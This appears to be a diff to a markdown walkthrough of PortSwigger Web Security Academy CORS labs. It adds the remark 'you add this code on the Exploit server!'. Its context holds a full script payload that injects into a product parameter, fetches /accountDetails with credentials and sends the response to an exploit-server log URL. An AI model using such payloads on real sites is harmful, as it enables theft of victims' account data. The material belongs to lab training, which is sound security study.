@@ -58,7 +58,8 @@ C) **CORS vulnerability with trusted insecure protocols**
     <script>
     document.location="http://stock.0a55009e038cde09c07b54ee00230042.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a55009e038cde09c07b54ee00230042.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a13006e037fdecbc0ae53ee0174000f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
     </script>
-
+        you add this code on the Exploit server!
+        
 D) **CORS vulnerability with internal network pivot attack**
 
 >    **1) Find the Vulnerable site on the local system(intranet) with port 8080**.
